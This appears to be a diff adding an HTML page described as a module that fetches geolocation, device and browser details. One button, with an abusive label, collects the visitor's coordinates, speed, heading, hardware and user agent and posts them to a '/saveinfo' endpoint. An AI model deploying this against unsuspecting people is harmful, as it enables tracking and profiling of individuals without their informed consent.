@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<!--
+MLBname=geolocation_device_info
+MLBdesc=module for fetching geolocation and device and browser information
+--> 
+    <head> 
+        <title>Lattitude and longitude</title> 
+    </head> 
+      <form>
+		<input type=button value="get located motherfucker" onClick="newfunc()">
+	</form>
+        <script language="JavaScript">
+
+//MLB-START
+
+//MLB-CALL
+			function newfunc() {
+				if (navigator.geolocation) {
+						      navigator.geolocation.getCurrentPosition((position)=>{
+							  var useragent = navigator.userAgent;
+							  var latitude = position.coords.latitude;
+							  var longitude = position.coords.longitude;
+							  var altitude = position.coords.altitude;
+							  var accuracy = position.coords.accuracy;
+							  var speed = position.coords.speed;
+							  var heading = position.coords.heading;
+							  var platform = navigator.platform;
+							  var hardware = navigator.hardwareConcurrency;
+							  var memory = navigator.deviceMemory;
+							  var height = window.screen.height;
+							  var width = window.screen.width;
+						    var buffer = "[DEVICE_INFO] \nlatitude= " + latitude + " \nlongitude= " + longitude + " \naltitude= " + altitude + " \nplatform= " + platform + " \naccuracy= " + accuracy + " \nspeed= " + speed + " \nheading= " + heading + " \nhardware= " + hardware + " \nmemory= " + memory + " \nuseragent= " + useragent + " \nheight= " + height + " \nwidth= " + width
+						      fetch("/saveinfo", {
+						      	method: 'POST',
+						      	body: JSON.stringify(buffer),
+						      	headers: {"Content-Type":"application/json"},
+						      	credentials:"same-origin"
+						      });
+						  }	)}
+						  }
+//MLB-END
+        </script>
+</html>
